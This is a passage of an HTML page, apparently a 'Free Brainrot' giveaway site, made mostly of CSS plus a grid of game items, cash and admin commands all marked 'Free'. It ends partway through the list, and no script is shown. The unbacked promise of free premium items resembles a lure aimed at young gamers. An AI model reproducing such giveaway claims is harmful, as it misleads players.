<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Free Brainrots</title>
    <meta name="description" content="Get your free Brainrot gear, GamePasses, and more on ProBoost">

    <!-- Favicon -->
    <link rel="icon" href="images/icon.png" type="image/png">

    <!-- Font Awesome para iconos -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <!-- Google Fonts para Press Start 2P y un toque más moderno -->
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

    <style>
        /*
           *******************************************************************
           * PEGA AQUÍ EL CONTENIDO DE:                                      *
           * - css/app.css                                                   *
           * - css/product.css                                               *
           * - css/swiper.min.css                                            *
           * - css/swipebox.css                                              *
           *                                                                 *
           * Asegúrate de que los estilos que ya están abajo (para el diseño *
           * blocky) sobrescriban o complementen los de estos archivos.      *
           *******************************************************************
        */

        :root {
            --primary-bg: #1a0033;
            --secondary-bg: #0d001a;
            --header-bg: #4a0080;
            --footer-bg: #4a0080;
            --product-bg: #6a00b3;
            --product-border: #4a0080;
            --text-primary: #ffeb3b; /* Amarillo brillante */
            --text-secondary: #00ff00; /* Verde neón */
            --text-tertiary: #00ffff; /* Cian neón */
            --button-primary: #007bff; /* Azul */
            --button-primary-hover: #0056b3;
            --button-selected: #28a745; /* Verde */
            --button-selected-hover: #218838;
            --button-finish: #ff0000; /* Rojo */
            --button-finish-hover: #b30000;
            --modal-bg: #111; /* Más oscuro */
            --modal-border-success: #00ff00;
            --modal-border-error: #ff0000;
            --input-bg: #050505;
            --input-border: #00ffff;
            --shadow-dark: rgba(0, 0, 0, 0.7);
            --shadow-darker: rgba(0, 0, 0, 0.9);
        }

        body {
            font-family: 'Press Start 2P', cursive;
            background: linear-gradient(168deg, var(--primary-bg), var(--secondary-bg));
            color: #fff;
            margin: 0;
            padding: 0;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased; /* Suavizado de fuentes para un aspecto más moderno */
            -moz-osx-font-smoothing: grayscale;
            image-rendering: -webkit-optimize-contrast; /* Mejor renderizado de imágenes */
            overflow-x: hidden;
            position: relative;
            z-index: 1;
        }

        /* Contenedor para el fondo animado */
        .lava-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
            background: linear-gradient(168deg, var(--primary-bg), var(--secondary-bg));
            filter: blur(2px); /* Ligero desenfoque para un efecto más etéreo */
        }

        /* Estilo para los cuadrados de la lámpara de lava - Más orgánicos y variados */
        .lava-square {
            position: absolute;
            background: rgba(255, 0, 255, 0.15); /* Púrpura translúcido */
            border: 1px solid rgba(255, 0, 255, 0.25);
            box-shadow: 0 0 15px rgba(255, 0, 255, 0.4); /* Sombra más suave y amplia */
            animation: lava-move 25s infinite ease-in-out alternate,
                       lava-rotate 20s infinite linear,
                       lava-pulse 6s infinite alternate;
            opacity: 0; /* Inicialmente oculto */
            transform-origin: center center;
            border-radius: 50%; /* Hacerlos circulares para un efecto más "lava" */
            filter: blur(1px); /* Pequeño desenfoque para suavizar bordes */
        }

        /* Variaciones de color para los cuadrados */
        .lava-square:nth-child(2n) {
            background: rgba(0, 255, 255, 0.15); /* Cian translúcido */
            border: 1px solid rgba(0, 255, 255, 0.25);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
        }
        .lava-square:nth-child(3n) {
            background: rgba(255, 255, 0, 0.15); /* Amarillo translúcido */
            border: 1px solid rgba(255, 255, 0, 0.25);
            box-shadow: 0 0 15px rgba(255, 255, 0, 0.4);
        }
        .lava-square:nth-child(4n) {
            background: rgba(0, 255, 0, 0.15); /* Verde translúcido */
            border: 1px solid rgba(0, 255, 0, 0.25);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.4);
        }

        /* Animaciones para los cuadrados - Movimiento más complejo y suave */
        @keyframes lava-move {
            0% { transform: translate(0, 0) scale(0.8); opacity: 0.6; }
            20% { transform: translate(25vw, 35vh) scale(1.1); opacity: 0.8; }
            40% { transform: translate(60vw, 15vh) scale(0.9); opacity: 0.7; }
            60% { transform: translate(85vw, 70vh) scale(1.3); opacity: 0.9; }
            80% { transform: translate(15vw, 90vh) scale(0.7); opacity: 0.6; }
            100% { transform: translate(0, 0) scale(0.8); opacity: 0.6; }
        }

        @keyframes lava-rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @keyframes lava-pulse {
            0% { box-shadow: 0 0 15px rgba(255, 0, 255, 0.4); }
            50% { box-shadow: 0 0 30px rgba(255, 0, 255, 0.7); }
            100% { box-shadow: 0 0 15px rgba(255, 0, 255, 0.4); }
        }

        /* Retrasos y tamaños para cada cuadrado */
        .lava-square:nth-child(1) { width: 90px; height: 90px; left: 10%; top: 20%; animation-delay: 0s; }
        .lava-square:nth-child(2) { width: 130px; height: 130px; left: 70%; top: 50%; animation-delay: 2.5s; }
        .lava-square:nth-child(3) { width: 70px; height: 70px; left: 30%; top: 80%; animation-delay: 5s; }
        .lava-square:nth-child(4) { width: 110px; height: 110px; left: 50%; top: 10%; animation-delay: 7.5s; }
        .lava-square:nth-child(5) { width: 100px; height: 100px; left: 85%; top: 30%; animation-delay: 10s; }
        .lava-square:nth-child(6) { width: 80px; height: 80px; left: 5%; top: 60%; animation-delay: 12.5s; }
        .lava-square:nth-child(7) { width: 120px; height: 120px; left: 40%; top: 40%; animation-delay: 15s; }
        .lava-square:nth-child(8) { width: 85px; height: 85px; left: 90%; top: 80%; animation-delay: 17.5s; }
        .lava-square:nth-child(9) { width: 105px; height: 105px; left: 20%; top: 5%; animation-delay: 20s; }
        .lava-square:nth-child(10) { width: 95px; height: 95px; left: 60%; top: 90%; animation-delay: 22.5s; }

        /* Efecto de partículas de fondo */
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            animation: particle-float 15s infinite ease-in-out alternate,
                       particle-fade 5s infinite alternate;
            pointer-events: none; /* Para que no interfieran con el clic */
            z-index: -2; /* Detrás de todo */
        }

        @keyframes particle-float {
            0% { transform: translateY(0) translateX(0); opacity: 0.5; }
            25% { transform: translateY(-20vh) translateX(10vw); opacity: 0.7; }
            50% { transform: translateY(-40vh) translateX(-15vw); opacity: 0.6; }
            75% { transform: translateY(-60vh) translateX(5vw); opacity: 0.8; }
            100% { transform: translateY(-80vh) translateX(-10vw); opacity: 0.5; }
        }

        @keyframes particle-fade {
            0% { opacity: 0.3; }
            50% { opacity: 0.8; }
            100% { opacity: 0.3; }
        }

        /* Generación de partículas con JS para mayor control */


        h1, h2, h3, p, button, label, input {
            font-family: 'Press Start 2P', 'Orbitron', cursive; /* Combinando fuentes */
        }

        .header {
            position: sticky;
            top: 0;
            background: var(--header-bg);
            z-index: 50;
            padding: 20px;
            text-align: center;
            box-shadow: 5px 5px 0px var(--shadow-dark);
            border-bottom: 4px solid var(--product-border);
            overflow: hidden; /* Para contener el brillo */
        }
        .header h1 {
            margin: 0;
            font-size: 2.8em; /* Un poco más grande */
            text-shadow: 4px 4px 0px rgba(0, 0, 0, 0.6);
            color: var(--text-primary);
            animation: text-pop-in 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) forwards,
                       neon-glow 1.5s infinite alternate; /* Efecto neón */
            opacity: 0;
            position: relative;
            display: inline-block; /* Para que el brillo funcione bien */
        }

        /* Animación de brillo neón para el título */
        @keyframes neon-glow {
            from { text-shadow: 4px 4px 0px rgba(0, 0, 0, 0.6), 0 0 10px var(--text-primary), 0 0 20px var(--text-primary); }
            to { text-shadow: 4px 4px 0px rgba(0, 0, 0, 0.6), 0 0 15px var(--text-primary), 0 0 30px var(--text-primary), 0 0 40px var(--text-primary); }
        }

        .hero {
            background: #000000;
            padding: 60px 20px;
            text-align: center;
            color: #fff;
            text-shadow: 2px 2px 0px var(--shadow-dark);
            flex-shrink: 0;
            border-bottom: 4px solid #333;
            position: relative;
            overflow: hidden;
        }
        .hero h2 {
            font-size: 2.5em; /* Un poco más grande */
            margin: 0;
            margin-bottom: 15px;
            color: var(--text-secondary);
            animation: text-pop-in 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) 0.2s forwards,
                       neon-glow-green 1.8s infinite alternate;
            opacity: 0;
        }
        .hero p {
            font-size: 1.3em; /* Un poco más grande */
            margin: 10px 0;
            color: var(--text-tertiary);
            animation: text-pop-in 1.4s cubic-bezier(0.68, -0.55, 0.27, 1.55) 0.4s forwards,
                       neon-glow-cyan 2s infinite alternate;
            opacity: 0;
        }

        @keyframes neon-glow-green {
            from { text-shadow: 2px 2px 0px rgba(0, 0, 0, 0.7), 0 0 8px var(--text-secondary); }
            to { text-shadow: 2px 2px 0px rgba(0, 0, 0, 0.7), 0 0 12px var(--text-secondary), 0 0 20px var(--text-secondary); }
        }
        @keyframes neon-glow-cyan {
            from { text-shadow: 2px 2px 0px rgba(0, 0, 0, 0.7), 0 0 8px var(--text-tertiary); }
            to { text-shadow: 2px 2px 0px rgba(0, 0, 0, 0.7), 0 0 12px var(--text-tertiary), 0 0 20px var(--text-tertiary); }
        }

        /* Animación para los títulos y párrafos */
        @keyframes text-pop-in {
            0% { opacity: 0; transform: scale(0.5) translateY(-20px); }
            80% { opacity: 1; transform: scale(1.05) translateY(5px); }
            100% { opacity: 1; transform: scale(1) translateY(0); }
        }

        main {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            z-index: 10;
        }
        .product-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); /* Productos un poco más grandes */
            gap: 25px; /* Más espacio entre productos */
            padding: 40px; /* Más padding */
            max-width: 1300px; /* Ancho máximo un poco mayor */
            margin: 0 auto;
            flex-grow: 1;
        }
        .product {
            background: var(--product-bg);
            border-radius: 8px; /* Bordes ligeramente redondeados para un toque moderno */
            padding: 20px; /* Más padding */
            text-align: center;
            transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94), box-shadow 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); /* Curva de animación más suave */
            box-shadow: 8px 8px 0px var(--shadow-dark); /* Sombra más pronunciada */
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            border: 5px solid var(--product-border); /* Borde más grueso */
            animation: product-fade-in 0.6s ease-out forwards; /* Animación de entrada más lenta y suave */
            opacity: 0;
            transform: translateY(30px); /* Inicia más abajo */
        }
        .product:hover {
            transform: translate(-6px, -6px) scale(1.03); /* Ligeramente más grande y desplazado */
            box-shadow: 12px 12px 0px var(--shadow-darker); /* Sombra más grande al pasar el ratón */
            z-index: 11; /* Asegura que el producto hover esté por encima */
        }

        /* Animación de entrada para productos */
        @keyframes product-fade-in {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Retrasos de animación para cada producto (se puede generar con JS para muchos productos) */
        .product:nth-child(1) { animation-delay: 0.1s; }
        .product:nth-child(2) { animation-delay: 0.15s; }
        .product:nth-child(3) { animation-delay: 0.2s; }
        .product:nth-child(4) { animation-delay: 0.25s; }
        .product:nth-child(5) { animation-delay: 0.3s; }
        .product:nth-child(6) { animation-delay: 0.35s; }
        .product:nth-child(7) { animation-delay: 0.4s; }
        .product:nth-child(8) { animation-delay: 0.45s; }
        .product:nth-child(9) { animation-delay: 0.5s; }
        .product:nth-child(10) { animation-delay: 0.55s; }
        .product:nth-child(11) { animation-delay: 0.6s; }
        .product:nth-child(12) { animation-delay: 0.65s; }
        .product:nth-child(13) { animation-delay: 0.7s; }
        .product:nth-child(14) { animation-delay: 0.75s; }
        .product:nth-child(15) { animation-delay: 0.8s; }
        .product:nth-child(16) { animation-delay: 0.85s; }
        .product:nth-child(17) { animation-delay: 0.9s; }
        .product:nth-child(18) { animation-delay: 0.95s; }
        .product:nth-child(19) { animation-delay: 1.0s; }
        .product:nth-child(20) { animation-delay: 1.05s; }
        .product:nth-child(21) { animation-delay: 1.1s; }
        .product:nth-child(22) { animation-delay: 1.15s; }
        .product:nth-child(23) { animation-delay: 1.2s; }
        .product:nth-child(24) { animation-delay: 1.25s; }
        .product:nth-child(25) { animation-delay: 1.3s; }
        .product:nth-child(26) { animation-delay: 1.35s; }
        .product:nth-child(27) { animation-delay: 1.4s; }
        .product:nth-child(28) { animation-delay: 1.45s; }
        .product:nth-child(29) { animation-delay: 1.5s; }
        .product:nth-child(30) { animation-delay: 1.55s; }


        .product img {
            max-width: 100%;
            height: 140px; /* Imágenes un poco más grandes */
            object-fit: contain;
            border-radius: 4px; /* Ligeramente redondeado */
            margin-bottom: 15px;
            border: 3px solid #333; /* Borde más grueso */
            image-rendering: -webkit-optimize-contrast;
            transition: transform 0.2s ease-out;
        }
        .product img:hover {
            transform: scale(1.05); /* Zoom sutil en la imagen */
        }
        .product h2 {
            font-size: 1.5em;
            margin: 10px 0;
            color: var(--text-primary);
            text-shadow: 3px 3px 0px rgba(0, 0, 0, 0.6);
        }
        .product p {
            font-size: 1.1em;
            margin: 10px 0 20px;
            color: #e0e0e0;
        }
        .select-btn {
            background: var(--button-primary);
            color: white;
            padding: 14px 25px; /* Más padding */
            border: none;
            border-radius: 4px; /* Ligeramente redondeado */
            cursor: pointer;
            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            font-size: 1.1em; /* Fuente ligeramente más grande */
            font-weight: bold;
            margin-top: auto;
            display: inline-block;
            opacity: 1;
            box-shadow: 5px 5px 0px rgba(0, 0, 0, 0.6);
            border: 3px solid var(--button-primary-hover);
            letter-spacing: 1px; /* Espaciado de letras */
        }
        .select-btn:hover {
            background: var(--button-primary-hover);
            transform: translate(3px, 3px); /* Desplazamiento más notorio */
            box-shadow: 2px 2px 0px rgba(0, 0, 0, 0.7);
        }
        .select-btn.selected {
            background: var(--button-selected);
            opacity: 1;
            box-shadow: 5px 5px 0px rgba(40, 167, 69, 0.6);
            border: 3px solid var(--button-selected-hover);
        }
        .select-btn.selected:hover {
            background: var(--button-selected-hover);
            transform: translate(3px, 3px);
        }
        .finish-btn {
            background: var(--button-finish);
            color: white;
            padding: 20px 40px; /* Más grande */
            border: none;
            border-radius: 8px; /* Ligeramente redondeado */
            cursor: pointer;
            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            font-size: 1.8em; /* Fuente más grande */
            font-weight: bold;
            display: block;
            margin: 60px auto; /* Más margen */
            box-shadow: 8px 8px 0px var(--shadow-darker);
            border: 5px solid var(--button-finish-hover);
            letter-spacing: 2px;
            animation: pulse-red 2s infinite; /* Animación de pulso */
        }
        .finish-btn:hover {
            background: var(--button-finish-hover);
            transform: translate(4px, 4px); /* Desplazamiento más notorio */
            box-shadow: 4px 4px 0px var(--shadow-darker);
        }

        @keyframes pulse-red {
            0% { box-shadow: 8px 8px 0px var(--shadow-darker), 0 0 0 0 rgba(255, 0, 0, 0.7); }
            70% { box-shadow: 8px 8px 0px var(--shadow-darker), 0 0 0 15px rgba(255, 0, 0, 0); }
            100% { box-shadow: 8px 8px 0px var(--shadow-darker), 0 0 0 0 rgba(255, 0, 0, 0); }
        }

        footer {
            background: var(--footer-bg);
            padding: 25px; /* Más padding */
            text-align: center;
            color: #fff;
            font-size: 1em; /* Fuente ligeramente más grande */
            box-shadow: 0 -6px 0px var(--shadow-dark);
            flex-shrink: 0;
            border-top: 4px solid var(--product-border);
            position: relative;
            z-index: 10;
        }
        footer p {
            margin: 0;
            text-shadow: 1px 1px 0px rgba(0, 0, 0, 0.5);
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.9); /* Fondo más oscuro */
            padding-top: 60px;
            animation: fadeIn 0.4s ease-out; /* Animación más suave */
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px); /* Efecto de desenfoque de fondo */
        }
        .modal-content {
            background-color: var(--modal-bg);
            margin: 5% auto;
            padding: 35px; /* Más padding */
            border: 6px solid var(--modal-border-success); /* Borde más grueso */
            width: 90%;
            max-width: 600px; /* Más ancho */
            border-radius: 10px; /* Bordes redondeados */
            box-shadow: 15px 15px 0px var(--shadow-darker); /* Sombra más pronunciada */
            position: relative;
            animation: slideInTop 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
            color: #fff;
            text-align: center;
            overflow: hidden; /* Para contener el brillo */
        }
        .modal-content h2 {
            color: var(--text-tertiary);
            margin-bottom: 30px;
            font-size: 2.2em; /* Título más grande */
            text-align: center;
            text-shadow: 4px 4px 0px rgba(0, 0, 0, 0.7);
            animation: neon-glow-cyan 1.5s infinite alternate;
        }
        .modal-content ul {
            list-style: none;
            padding: 0;
            margin-bottom: 25px;
            max-height: 300px; /* Más alto */
            overflow-y: auto;
            border: 4px solid var(--modal-border-success); /* Borde más grueso */
            border-radius: 8px; /* Bordes redondeados */
            padding: 15px;
            background-color: var(--input-bg); /* Fondo más oscuro */
            box-shadow: inset 0 0 10px rgba(0, 255, 255, 0.2); /* Sombra interior sutil */
        }
        .modal-content ul li {
            padding: 10px 0;
            border-bottom: 1px dashed #444; /* Línea más suave */
            font-size: 1.1em;
            color: #eee;
            transition: color 0.2s ease;
        }
        .modal-content ul li:last-child {
            border-bottom: none;
        }
        .modal-content ul li:hover {
            color: var(--text-secondary); /* Resaltar al pasar el ratón */
        }
        .modal-content label {
            display: block;
            margin-bottom: 12px;
            font-weight: bold;
            color: var(--text-secondary);
            font-size: 1.2em;
            text-shadow: 1px 1px 0px rgba(0, 0, 0, 0.5);
        }
        .modal-content input[type="text"],
        .modal-content input[type="number"] {
            width: calc(100% - 30px); /* Ajuste de ancho */
            padding: 12px;
            margin-bottom: 25px;
            border: 4px solid var(--input-border);
            border-radius: 6px;
            font-size: 1.1em;
            background-color: var(--input-bg);
            color: #fff;
            box-shadow: inset 4px 4px 0px rgba(0, 0, 0, 0.7);
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        .modal-content input[type="text"]:focus,
        .modal-content input[type="number"]:focus {
            outline: none;
            border-color: var(--text-secondary);
            box-shadow: inset 4px 4px 0px rgba(0, 0, 0, 0.7), 0 0 10px var(--text-secondary);
        }
        .modal-content button {
            background: var(--button-finish);
            color: white;
            padding: 18px 35px; /* Más padding */
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            font-size: 1.5em;
            font-weight: bold;
            display: block;
            width: 100%;
            box-shadow: 6px 6px 0px var(--shadow-darker);
            border: 4px solid var(--button-finish-hover);
            letter-spacing: 1px;
        }
        .modal-content button:hover {
            background: var(--button-finish-hover);
            transform: translate(3px, 3px);
            box-shadow: 3px 3px 0px var(--shadow-darker);
        }
        .close {
            color: var(--text-tertiary);
            float: right;
            font-size: 38px; /* Más grande */
            font-weight: bold;
            position: absolute;
            top: 15px;
            right: 20px;
            transition: color 0.3s ease, transform 0.3s ease;
            text-shadow: 3px 3px 0px rgba(0, 0, 0, 0.6);
        }
        .close:hover,
        .close:focus {
            color: #fff;
            text-decoration: none;
            cursor: pointer;
            transform: rotate(90deg); /* Animación de rotación */
        }

        /* Nuevos estilos para los modales de éxito/error */
        .modal-success-content, .modal-error-content {
            background: var(--modal-bg);
            padding: 30px; /* Más padding */
            border: 6px solid var(--modal-border-success);
            width: 80%;
            max-width: 500px; /* Más ancho */
            text-align: center;
            border-radius: 10px;
            font-family: 'Press Start 2P', cursive;
            color: white;
            box-shadow: 15px 15px 0px var(--shadow-darker);
            animation: slideInTop 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
            overflow: hidden;
        }
        .modal-success-content i {
            color: var(--modal-border-success);
            font-size: 70px; /* Icono más grande */
            text-shadow: 5px 5px 0px rgba(0, 0, 0, 0.7);
            animation: icon-bounce 1s infinite alternate; /* Animación de rebote para iconos */
        }
        .modal-error-content {
            border: 6px solid var(--modal-border-error);
        }
        .modal-error-content i {
            color: var(--modal-border-error);
            font-size: 70px;
            text-shadow: 5px 5px 0px rgba(0, 0, 0, 0.7);
            animation: icon-shake 0.5s infinite alternate; /* Animación de temblor para error */
        }
        .modal-success-content p, .modal-error-content p {
            font-size: 1.2em; /* Fuente ligeramente más grande */
            margin-top: 20px; /* Más margen */
            font-family: 'Press Start 2P', cursive;
            text-shadow: 2px 2px 0px rgba(0, 0, 0, 0.6);
        }

        @keyframes icon-bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        @keyframes icon-shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }


        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        /* Animación de rebote para modales */
        @keyframes slideInTop {
            0% { transform: translateY(-150px) scale(0.8); opacity: 0; }
            60% { transform: translateY(15px) scale(1.05); opacity: 1; }
            80% { transform: translateY(-8px) scale(0.98); }
            100% { transform: translateY(0) scale(1); opacity: 1; }
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.2em;
            }
            .hero h2 {
                font-size: 2em;
            }
            .hero p {
                font-size: 1.1em;
            }
            .product-list {
                grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
                gap: 15px;
                padding: 20px;
            }
            .product {
                padding: 15px;
            }
            .product img {
                height: 100px;
            }
            .product h2 {
                font-size: 1.3em;
            }
            .product p {
                font-size: 0.9em;
            }
            .select-btn {
                padding: 10px 15px;
                font-size: 0.9em;
            }
            .finish-btn {
                padding: 15px 25px;
                font-size: 1.3em;
                margin: 40px auto;
            }
            .modal-content {
                padding: 25px;
                max-width: 95%;
            }
            .modal-content h2 {
                font-size: 1.8em;
            }
            .modal-content input[type="text"],
            .modal-content input[type="number"] {
                padding: 10px;
                font-size: 1em;
            }
            .modal-content button {
                padding: 12px 25px;
                font-size: 1.2em;
            }
            .modal-success-content i, .modal-error-content i {
                font-size: 50px;
            }
            .modal-success-content p, .modal-error-content p {
                font-size: 1em;
            }
            .close {
                font-size: 30px;
                top: 10px;
                right: 10px;
            }
        }
    </style>
</head>
<body>

<!-- Contenedor para el fondo animado de lámpara de lava con cuadrados -->
<div class="lava-background">
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
    <div class="lava-square"></div>
</div>

<!-- Contenedor para partículas -->
<div id="particle-container"></div>

<div class="header">
    <h1>Free Brainrot</h1>
</div>

<div class="hero">
    <h2>Welcome to the Free Brainrot!</h2>
    <p>Your one-stop destination for all Brainrot gear and GamePasses.</p>
</div>

<main>
    <div class="product-list">
        <div class="product">
            <img src="images/100000.png" alt="$100000">
            <h2>$100000</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, '$100000')">Select</button>
        </div>
        <div class="product">
            <img src="images/1000000.png" alt="$1000000">
            <h2>$1000000</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, '$1000000')">Select</button>
        </div>
        <div class="product">
            <img src="images/25000.png" alt="$25000">
            <h2>$25000</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, '$25000')">Select</button>
        </div>
        <div class="product">
            <img src="images/2x-money.png" alt="2X Money">
            <h2>2X Money</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, '2X Money')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-admin-commands.png" alt="Admin Commands">
            <h2>Admin Commands</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Admin Commands')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-blackhole-starter-pack.png" alt="Blackhole Starter Pack">
            <h2>Blackhole Starter Pack</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Blackhole Starter Pack')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-diamond-graipuss-medussi.png" alt="Diamond Graipuss Medussi">
            <h2>Diamond Graipuss Medussi</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Diamond Graipuss Medussi')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-diamond-la-vacca-saturno-saturnita.png" alt="Diamond La Vacca Saturno Saturnita">
            <h2>Diamond La Vacca Saturno Saturnita</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Diamond La Vacca Saturno Saturnita')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-diamond-los-tralaleritos.png" alt="Diamond Los Tralaleritos">
            <h2>Diamond Los Tralaleritos</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Diamond Los Tralaleritos')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-diamond-sammyni-spiderini.png" alt="Diamond Sammyni Spiderini">
            <h2>Diamond Sammyni Spiderini</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Diamond Sammyni Spiderini')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-golden-graipuss-medussi.png" alt="Golden Graipuss Medussi">
            <h2>Golden Graipuss Medussi</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Golden Graipuss Medussi')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-golden-la-grande-combinasion.png" alt="Golden La Grande Combinasion">
            <h2>Golden La Grande Combinasion</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Golden La Grande Combinasion')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-golden-los-tralaleritos.png" alt="Golden Los Tralaleritos">
            <h2>Golden Los Tralaleritos</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Golden Los Tralaleritos')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-golden-tralalero-tralala.png" alt="Golden Tralalero Tralala">
            <h2>Golden Tralalero Tralala</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Golden Tralalero Tralala')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-graipuss-medussi.png" alt="Graipuss Medussi">
            <h2>Graipuss Medussi</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Graipuss Medussi')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-la-grande-combinasion.png" alt="La Grande Combinasion">
            <h2>La Grande Combinasion</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'La Grande Combinasion')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-mythic-lucky-block.png" alt="Mythic Lucky Block">
            <h2>Mythic Lucky Block</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Mythic Lucky Block')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-odin-din-din-dun.png" alt="Odin Din Din Dun">
            <h2>Odin Din Din Dun</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Odin Din Din Dun')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-rainbow-graipuss-medussi.png" alt="Rainbow Graipuss Medussi">
            <h2>Rainbow Graipuss Medussi</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Rainbow Graipuss Medussi')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-rainbow-la-vacca-saturno-saturnita.png" alt="Rainbow La Vacca Saturno Saturnita">
            <h2>Rainbow La Vacca Saturno Saturnita</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Rainbow La Vacca Saturno Saturnita')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-rainbow-odin-din-din-dun.png" alt="Rainbow Odin Din Din Dun">
            <h2>Rainbow Odin Din Din Dun</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Rainbow Odin Din Din Dun')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-rainbow-tralalero-tralala.png" alt="Rainbow Tralalero Tralala">
            <h2>Rainbow Tralalero Tralala</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Rainbow Tralalero Tralala')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-sammyni-spiderini.png" alt="Sammyni Spiderini">
            <h2>Sammyni Spiderini</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Sammyni Spiderini')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-secret-lucky-block.png" alt="Secret Lucky Block">
            <h2>Secret Lucky Block</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Secret Lucky Block')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-tralalero-tralala.png" alt="Tralalero Tralala">
            <h2>Tralalero Tralala</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Tralalero Tralala')">Select</button>
        </div>
        <div class="product">
            <img src="images/all-server-trenostruzzo-turbo-3000.png" alt="Trenostruzzo Turbo 3000">
            <h2>Trenostruzzo Turbo 3000</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Trenostruzzo Turbo 3000')">Select</button>
        </div>
        <div class="product">
            <img src="images/ban-hammer.png" alt="Ban Hammer">
            <h2>Ban Hammer</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Ban Hammer')">Select</button>
